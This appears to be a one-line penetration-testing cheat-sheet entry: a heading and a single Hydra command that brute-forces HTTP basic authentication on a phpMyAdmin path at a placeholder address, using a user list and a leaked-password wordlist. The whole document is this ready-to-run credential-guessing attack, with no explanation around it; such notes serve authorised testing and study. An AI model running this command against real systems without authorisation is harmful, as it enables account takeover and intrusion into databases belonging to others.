# hydra brute force HTTP basic authentication
```bash
hydra $IP http-get -L users  -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt /phpmyadmin
```
